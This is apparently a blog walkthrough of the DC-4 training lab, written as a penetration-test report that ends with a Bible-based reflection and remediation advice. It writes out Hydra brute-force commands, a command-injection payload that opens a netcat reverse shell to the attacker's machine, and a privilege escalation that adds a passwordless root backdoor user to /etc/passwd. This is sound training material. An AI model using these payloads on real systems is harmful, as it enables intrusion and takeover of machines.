# Unearthing the Truth in DC-4 \| Breaking Strongholds & Command Injection 🛡️

From fortified login screens to root command execution, we dismantle the walls. 100% completion rooted in precision and faith. 🎯🙏

---

### Unearthing the Truth in DC-4 \| Breaking Strongholds & Command Injection 🛡️

#### From fortified login screens to root command execution, we dismantle the walls. 100% completion rooted in precision and faith. 🎯🙏

**Target:** *DC-4 (192.168.219.195) \[PG OffSec\]* **OS**: *Linux (Debian)* **Difficulty:** *Intermediate* **Attack Vectors:** *Web Authentication Brute Force -\> Command Injection -\> Privilege Escalation*

![](https://cdn-images-1.medium.com/max/800/1*cQl3TEBEZcsqxGW9nPEESA.png)

> <a href="https://medium.com/the-first-digit/unearthing-the-truth-in-dc-4-breaking-strongholds-command-injection-%EF%B8%8F-fb86d36c9047?sk=4302b3ed78779b20ba9e3b38301150d0" class="markup--anchor markup--pullquote-anchor" data-href="https://medium.com/the-first-digit/unearthing-the-truth-in-dc-4-breaking-strongholds-command-injection-%EF%B8%8F-fb86d36c9047?sk=4302b3ed78779b20ba9e3b38301150d0" target="_blank">**Not a Member?? Click Here to Read Full-Story**</a>

#### Executive Summary

**Assessment Date:** *January 23, 2026* **Risk Level:** *CRITICAL* **Author:** *R00t3dbyFa17h\Nicholas Mullenski*

#### Overview

An initial assessment of the “DC-4” server reveals a minimal attack surface exposing only HTTP (Nginx) and SSH. The web application, titled “System Tools,” appears to be an administrative interface. Preliminary analysis suggests this login portal is the primary entry point, likely requiring credential enumeration or brute-force techniques to bypass authentication.

#### Key Findings (Preliminary):

- <span id="13bf">**Web Exposure:** Port 80 is running Nginx 1.15.10. The page title “System Tools” implies privileged functionality is accessible via the web if authentication is bypassed.</span>
- <span id="9474">**SSH Availability:** Port 22 is open, providing a potential avenue for stable shell access once credentials are harvested from the web application.</span>

**Strategic Recommendation (Phase 1):** Investigate the web application on Port 80. Identify the login mechanism and capture the request structure to perform a targeted brute-force attack.

### 1.0 Initial Foothold

#### 1.1 Enumeration & Reconnaissance

- <span id="104c">The objective of this phase was to identify the attack surface of the target machine and pinpoint specific service versions that may contain known vulnerabilities.</span>

**1.1.1 Nmap Scan** a full service and script scan was performed to identify open ports and the software versions running on them.

Command:

```
nmap -sCV -vvv -Pn 192.168.219.195

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey:
|   2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCp6/VowbK8MWfMDQsxHRV2yvL8ZO+FEkyIBPnDwTVKkJiVKaJMZ5ztAwTnkc30c3tvC/yCqDAJ5IbHzgvR3kHKS37d17K+/OLxalDutFjrWjG7mBxhMW/0gnrCqJokZBDXDuvHQonajsfSN6FmWoP0PDsfL8NQXwWIoMvTRYHtiEQqczV5CYZZtMKuOyiLCiWINUqKMwY+PTb0M9RzSGYSJvN8sZZnvIw/xU7xBCmaWuq8h2dIfsxy+FhrwZMhvhJOpBYtwZB+hos3bbV5FKHhVztxEo+Y2vyKTl6MXJ4qwCChJdaBAip/aUt1zDoF3cIb+yebteyDk8KIqmp5Ju4r
|   256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIbZ4PXPXShXCcbe25IY3SYbzB4hxP4K2BliUGtuYSABZosGlLlL1Pi214yCLs3ORpGxsRIHv8R0KFQX+5SNSog=
|   256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDcvQZ2DbLqSSOzIbIXhyrDJ15duVKd9TEtxfX35ubsM

80/tcp open  http    syn-ack ttl 61 nginx 1.15.10
|_http-server-header: nginx/1.15.10
|_http-title: System Tools
| http-methods:
|_  Supported Methods: GET HEAD POST
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Results:** The scan identified two key open ports:

- <span id="60fe">**22/tcp (SSH):** OpenSSH 7.4p1 Debian.</span>
- <span id="ce0b">**80/tcp (HTTP):** Nginx 1.15.10.</span>
- <span id="138e">***Observation:*** `http-title: System Tools`</span>
- <span id="3557">***Analysis:*** The title suggests an administrative dashboard. Unlike previous DC boxes running Apache, this host utilizes Nginx.</span>

#### 1.2 Credential Harvesting

**1.2.1** After refining the Hydra syntax to filter out false positives (using the specific page title as the failure condition), the attack successfully identified the valid credentials.

**Command:**

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.219.195 http-post-form "/login.php:username=^USER^&password=^PASS^:F=Admin Information Systems Login"
```

![](https://cdn-images-1.medium.com/max/800/1*5PRF57yEZtqHeNRIjxdIiA.png)

### 2.0 Web Exploitation

### 2.1 Command Injection & Reverse Shell

**2.1.1** Upon successfully authenticating with the credentials (`admin` / xxxxxxx), I was presented with a "Command Execution" dashboard. This interface allowed the user to select predefined commands (e.g., `ls -l`) to run on the system.

![](https://cdn-images-1.medium.com/max/800/1*LTJIfuRHeZfuKAHALpPcNQ.png)

**2.1.2 Vulnerability Analysis:** I intercepted the execution request using **Burp Suite** and identified that the application was passing the user’s selection directly to the system shell without proper sanitization. This allowed for **Command Injection** by appending a semicolon (`;`) to the request, enabling the execution of arbitrary code.

**2.1.3 Exploitation Steps:** I established a Netcat listener on my local attack machine (`nc -lvnp 4444`) and modified the intercepted HTTP POST request in Burp Suite to inject a reverse shell payload.

- <span id="dc6d">**Original Parameter:** `radio=ls+-l`</span>
- <span id="5eef">**Injected Payload:** `radio=ls+-l;+nc+-e+/bin/sh+192.168.45.XXX+4444`</span>

![](https://cdn-images-1.medium.com/max/800/1*OXD7QZytCL0J0NPiBSBrtw.png)

**Result:** The server executed the injected command, establishing a reverse shell connection and providing me with initial access as the `www-data` user.

![](https://cdn-images-1.medium.com/max/800/1*6VXZH71o8kvL_T0R_APrlQ.png)

#### 2.2 Internal Enumeration

**2.2.1** With the reverse shell established, I stabilized the environment using Python (`import pty; pty.spawn("/bin/bash")`) and began enumerating the file system. Navigating to the `/home` directory revealed three users: `charles`, `jim`, and `sam`.

![](https://cdn-images-1.medium.com/max/800/1*fWM-RJVWftsafh0F4ejaGQ.png)

**2.2.2** inspecting `/home/jim/local.txt` reveals the First Flag of this lab.

![](https://cdn-images-1.medium.com/max/800/1*QbICl1xJRVlQZcMWnZGIJA.png)

**2.2.3** Further inspection of `/home/jim` uncovered a `backups` directory containing a file named `old-passwords.bak`. Reading this file (`cat old-passwords.bak`) revealed a list of previous passwords, indicating potential credential reuse.

#### 2.3 SSH Brute Force (Jim)

**2.3.1** Recognizing the password list as a vector for lateral movement, I copied the contents to my attack machine (`jimpass.txt`) and launched an SSH brute-force attack targeting the user **jim**.

**Command:**

```
hydra -l jim -P jimpass.txt 192.168.219.195 ssh
```

**Results:**

![](https://cdn-images-1.medium.com/max/800/1*vr0jLPinuhCqRO-B0mP5ZA.png)

#### 2.4 Lateral Movement (Charles)

**2.4.1** Upon accessing the system as **jim**, I checked the local mail spool (`/var/mail/jim`) for internal communications. The mailbox contained an email from the user **Charles** regarding a holiday handover.

![](https://cdn-images-1.medium.com/max/800/1*DqSaOjYMt92CQzT1BFKFWQ.png)

**2.4.2 Key Findings:** The email contained Charles’s password in cleartext, provided “just in case anything goes wrong.”

- <span id="f6c9">**Sender:** `charles@dc-4`</span>
- <span id="9135">**Subject:** Holidays</span>
- <span id="42d1">**Credential Revealed:** `XXXXXXXXX`</span>

**2.4.3** Using this password, I successfully authenticated as the user **charles** via the `su` command, further elevating my access within the system.

### 3.0 Privilege Escalation (Root)

#### 3.1 Sudo Rights Enumeration

Upon accessing the `charles` account, I checked for administrative privileges using the `sudo -l` command. The output confirmed that `charles` was permitted to execute the binary `/usr/bin/teehee` as **root** without a password.

- <span id="8717">**Vulnerability:** Insecure Sudo Configuration (`NOPASSWD`)</span>
- <span id="1916">**Binary:** `/usr/bin/teehee` (A custom variant of the `tee` command).</span>

#### 3.2 Exploitation (Passwd File Manipulation)

**3.2.1** The `teehee` binary functionality allows writing standard input to a file. By leveraging the root privileges granted via sudo, I utilized this tool to append a new entry to the `/etc/passwd` file.

**Exploitation Command:**

```
echo "evilr00t::0:0:root:/root:/bin/bash" | sudo teehee -a /etc/passwd
```

**3.2.2 Payload Analysis:**

- <span id="d92c">**User:** `evilr00t`</span>
- <span id="e888">**Password:** `::` (Empty, allowing passwordless login).</span>
- <span id="f73a">**UID/GID:** `0:0` (Assigning Root privileges).</span>
- <span id="e563">**Shell:** `/bin/bash`</span>

**3.2.3 Outcome:** The command successfully injected the backdoor user. I immediately switched to this account using `su evilr00t`, gaining full **Root** access to the system and retrieving the final flag located in `/root/proof.txt`.

![](https://cdn-images-1.medium.com/max/800/1*Rxc9Bz6bLZIVKSbYjZSbHg.png)

### 4.0 Red Team Mandate & Remediation

**Assessment Summary:** The total compromise of DC-4 highlights a critical failure in **Input Validation** and **Configuration Management**. The initial breach was not caused by a complex exploit, but by the application’s blind trust of user input, allowing for simple Command Injection. Furthermore, the internal network was riddled with artifacts of poor security hygiene: unencrypted backup files (`old-passwords.bak`) left in readable directories and custom binaries (`teehee`) granted dangerous Sudo privileges without review. The system fell because it failed to filter what entered it and failed to secure what was stored within it.

**Immediate Remediation Steps:**

1.  <span id="1edb">**Input Sanitization (Web Application):** The “System Tools” dashboard accepts raw user input and passes it directly to the system shell. Immediate remediation requires implementing strict input validation (allow-listing) to reject metacharacters like semicolons (`;`), pipes (`|`), and backticks (`` ` ``).</span>
2.  <span id="7782">**Sudo Privilege Review:** The custom binary `/usr/bin/teehee` allows users to write standard input to *any* file. Granting this `NOPASSWD` access as root effectively gives any user full administrative control. This entry must be removed from `/etc/sudoers` immediately.</span>
3.  <span id="8377">**Data Hygiene & Backup Policy:** The discovery of `old-passwords.bak` containing valid credentials in a user’s home directory is a severe policy violation. Automated scripts should be deployed to scan for and purge sensitive plain-text backups from user directories.</span>
4.  <span id="af32">**Brute Force Mitigation:** The login portal lacked account lockout policies, allowing for unlimited password guessing. Implement Rate Limiting and Account Lockout mechanisms (e.g., Fail2Ban) to thwart brute-force attacks.</span>

### ✝️ The Spiritual Root

> “Keep thy heart with all diligence; for out of it are the issues of life.”* — ****Proverbs 4:23 (KJV)***

**Connection to the Tool:** In this assessment, the primary attack vector was **Command Injection**. The server’s fatal flaw was that it did not “keep” (guard) its input fields. It accepted whatever we typed — malicious code mixed with innocent commands — and executed it without question. Because it failed to filter the input, the “heart” of the system (the kernel/shell) was compromised, leading to total destruction.

**The Lesson:** Spiritually, our minds and hearts operate much like that web server. We are constantly bombarded with “inputs” — words from others, media, negative thoughts, and lies about our identity. If we do not apply “Input Validation” — if we fail to guard our hearts with diligence — we allow toxic commands to execute in our spirits. Just as we injected a reverse shell to take control of DC-4, the enemy seeks to inject lies that take control of our lives. We must act as the firewall of our own souls, filtering every thought through the truth of God’s Word before we allow it to take root.

**Rooted in Faith,** *R00t3dbyFa17h\Nicholas Mullenski*

### 🚀 Join the Mission

I don’t want to do this alone. I want to build a community of people who are hungry to learn, build, and break things (ethically). I am constantly looking for the next challenge.

- <span id="e43f">Is there a specific tool you wish existed?</span>
- <span id="0e4b">Is there a hacking concept you want me to learn and explain?</span>
- <span id="a49d">Do you have a “brick wall” you’re hitting in your own research?</span>

Jump into the server, drop a message, and tell me what I should build or learn next. Let’s sharpen each other.

<a href="https://discord.gg/bKWJUSVNyX" class="markup--anchor markup--mixtapeEmbed-anchor" data-href="https://discord.gg/bKWJUSVNyX" title="https://discord.gg/bKWJUSVNyX"><strong>Join the Iron-Breach Discord Server!</strong><br />
<em>Welcome to Iron Breach. A community where iron sharpens iron. Join us for ethical hacking, CTF challenges, and…</em>discord.gg</a><a href="https://discord.gg/bKWJUSVNyX" class="js-mixtapeImage mixtapeImage mixtapeImage--empty u-ignoreBlock" data-media-id="d169f9c5e9c4caaa5161c9260fe8006b"></a>

By <a href="https://medium.com/@nicholasmullenski" class="p-author h-card">Nicholas Mullenski</a> on [January 28, 2026](https://medium.com/p/fb86d36c9047).

<a href="https://medium.com/@nicholasmullenski/unearthing-the-truth-in-dc-4-breaking-strongholds-command-injection-%EF%B8%8F-fb86d36c9047" class="p-canonical">Canonical link</a>

Exported from [Medium](https://medium.com) on September 1, 2026.
